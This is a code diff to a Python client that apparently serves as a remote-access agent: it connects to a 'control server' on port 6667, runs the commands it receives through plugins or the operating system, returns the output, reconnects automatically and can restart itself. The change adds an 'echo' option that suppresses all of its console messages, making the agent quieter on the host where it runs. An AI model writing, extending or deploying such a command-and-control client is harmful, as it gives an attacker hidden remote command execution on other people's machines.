@@ -6,7 +6,10 @@ import subprocess
 from os.path import realpath
 from base64 import b64decode
 from time import sleep
-from common import PluginRunner, LoopController
+from common import PluginRunner
+from common import LoopReturnEvent
+from common import LoopContinueEvent
+from common import LoopBreakEvent
 
 
 class Client(PluginRunner):
@@ -15,11 +18,12 @@ class Client(PluginRunner):
     server commands to the OS, or to Client plugins.
     """
 
-    def __init__(self, host='', port=6667, recv_size=1024, session_id=''):
+    def __init__(self, host='', port=6667, recv_size=1024, session_id='', echo=True):
         self.host = host
         self.port = port
         self.recv_size = recv_size
         self.session_id = session_id
+        self.echo = echo
         self.reconnect_to_session = True
         self.ip_address = '0.0.0.0'
         self.connected_port = '00000'
@@ -40,10 +44,12 @@ class Client(PluginRunner):
             self.sock = socket.socket()
             try:
                 self.sock.connect((self.host, self.port))
-                print('< Connected to server. >')
+                if self.echo:
+                    print('< Connected to server. >')
                 break
             except socket.error as the_error_message:
-                print('< Waiting for control server {}:{} {} >'.format(self.host, self.port, the_error_message))
+                if self.echo:
+                    print('< Waiting for control server {}:{} {} >'.format(self.host, self.port, the_error_message))
                 sleep(5)
 
         return self.sock
@@ -110,7 +116,8 @@ class Client(PluginRunner):
         """
 
         if echo:
-            print('< Sending Data:', some_data, '>')
+            if self.echo:
+                print('< Sending Data:', some_data, '>')
 
         if encode:
             self.sock.send(str.encode(str(some_data)))
@@ -134,19 +141,22 @@ class Client(PluginRunner):
         # Try to receive data.
         accepting = True
         total_data = ''
-        print('< Receiving data. >')
+        if self.echo:
+            print('< Receiving data. >')
         while accepting:
             try:
                 data = self.sock.recv(self.recv_size)
             except socket.error as error_message:
-                print('Server closed connection:', error_message)
+                if self.echo:
+                    print('Server closed connection:', error_message)
                 self.sock.close()
                 self.sock = self._connect_to_server()
                 continue
 
             # Continue looping if there is no data.
             if len(data) < 1:
-                print('< Zero data received. >', end='\r')
+                if self.echo:
+                    print('< Zero data received. >', end='\r')
                 self.sock.close()
                 self.sock = self._connect_to_server()
                 continue
@@ -159,14 +169,16 @@ class Client(PluginRunner):
 
             total_data += d
             if echo:
-                print('Data:', d)
+                if self.echo:
+                    print('Data:', d)
 
             # Check for termination string.
             if total_data[-10:] == '~!_TERM_$~':
                 accepting = False
 
         if echo:
-            print('Data received: {}'.format(total_data[:-10]))
+            if self.echo:
+                print('Data received: {}'.format(total_data[:-10]))
 
         # Chop off the termination string from the total data and assign it to data.
         # Data should now be a string as well.
@@ -191,7 +203,8 @@ class Client(PluginRunner):
         :return:
         """
 
-        print('< Rebooting self. >')
+        if self.echo:
+            print('< Rebooting self. >')
         try:
             self.sock.close()
         except socket.error:
@@ -211,7 +224,8 @@ class Client(PluginRunner):
             p.communicate()
         except PermissionError:
             from os import execv
-            print('< Using execv. >')
+            if self.echo:
+                print('< Using execv. >')
             rc.pop(0)
             rc.insert(0, realpath(__file__))
             rc.insert(0, '')
@@ -226,7 +240,8 @@ class Client(PluginRunner):
         :return:
         """
 
-        print('< Disconnecting. >')
+        if self.echo:
+            print('< Disconnecting. >')
         # Handle a disconnect command.
         self.send_data('confirmed')
         self.sock.close()
@@ -242,7 +257,8 @@ class Client(PluginRunner):
         """
 
         plugin_list = self.get_client_plugins()
-        print('< Loaded {} plugins. >'.format(len(plugin_list)))
+        if self.echo:
+            print('< Loaded {} plugins. >'.format(len(plugin_list)))
 
         # If we have a socket, then proceed to receive commands.
         if self.sock:
@@ -256,16 +272,19 @@ class Client(PluginRunner):
 
                 # # # # # # # PROCESS PLUGINS # # # # # # #
                 if not data[0] == '\\':
-                    plugin_ran, loop_controller = self.process_plugins(plugin_list, data)
+                    plugin_ran, obj = self.process_plugins(plugin_list, data)
                     if plugin_ran:
-                        if isinstance(loop_controller, LoopController):
-                            if loop_controller.should_break:
-                                break
-                            if loop_controller.should_return:
-                                return loop_controller.return_value
-                            if loop_controller.should_continue:
-                                continue
-                        continue
+                        # Check for events!
+                        if isinstance(obj, LoopBreakEvent):
+                            break
+
+                        elif isinstance(obj, LoopContinueEvent):
+                            continue
+
+                        elif isinstance(obj, LoopReturnEvent):
+                            return obj.value
+                        else:
+                            continue
 
                 # Process the command.
                 try:
@@ -292,8 +311,8 @@ class Client(PluginRunner):
                     output_str = str(output_bytes, 'utf-8')
                 except TypeError:
                     output_str = str(output_bytes.decode('utf-8'))
-
-                print('Output Str: {}'.format(output_str))
+                if self.echo:
+                    print('Output Str: {}'.format(output_str))
                 # Send the output back to control server.
                 self.send_data(output_str)
 
@@ -304,12 +323,14 @@ if __name__ == '__main__':
         the_port = 6667
         the_recv_size = 1024
         the_session_id = ''
+        the_echo = True
 
         def check_cli_arg(arg):
             global the_host
             global the_port
             global the_recv_size
             global the_session_id
+            global the_echo
 
             if 'host=' in arg:
                 the_host = arg.split('=')[1]
@@ -319,6 +340,8 @@ if __name__ == '__main__':
                 the_recv_size = int(arg.split('=')[1])
             elif 'session_id=' in arg:
                 the_session_id = arg.split('=')[1].strip()
+            elif 'echo=' in arg:
+                the_echo = False if arg.split('=')[1].strip().upper() == 'N' else True
 
         for argument in sys.argv[1:]:
             check_cli_arg(argument)
@@ -328,7 +351,8 @@ if __name__ == '__main__':
             host=the_host,
             port=the_port,
             recv_size=the_recv_size,
-            session_id=the_session_id
+            session_id=the_session_id,
+            echo=the_echo
         )
 
         client.main()
